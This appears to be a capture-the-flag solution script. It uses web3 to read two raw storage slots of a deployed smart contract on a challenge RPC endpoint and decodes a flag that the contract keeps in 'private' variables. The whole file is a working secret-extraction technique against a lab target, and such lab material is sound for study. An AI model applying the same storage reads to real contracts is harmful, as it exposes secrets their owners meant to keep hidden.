#!/usr/bin/env python3
from web3 import Web3

# RPC endpoint given by the challenge
RPC_URL = "http://labs.ctfzone.com:8545"

# Deployed contract address
CONTRACT_ADDRESS = "0xe78A0F7E598Cc8b0Bb87894B0F60dD2a88d6a8Ab"

# Connect to the blockchain RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("[!] Failed to connect to RPC")
    exit(1)

print("[+] Connected to RPC")

# Flag is stored in private bytes32 variables:
# slot 6 = _flagPart1
# slot 7 = _flagPart2
flag_slots = [6, 7]

flag = ""

for slot in flag_slots:
    # Read raw 32-byte storage value from the contract
    raw_data = w3.eth.get_storage_at(CONTRACT_ADDRESS, slot)

    # Convert bytes to readable text and remove null padding
    decoded = raw_data.rstrip(b"\x00").decode(errors="ignore")

    print(f"[+] Slot {slot}: {decoded}")

    # Join both flag parts
    flag += decoded

print("\n[+] Flag:", flag)
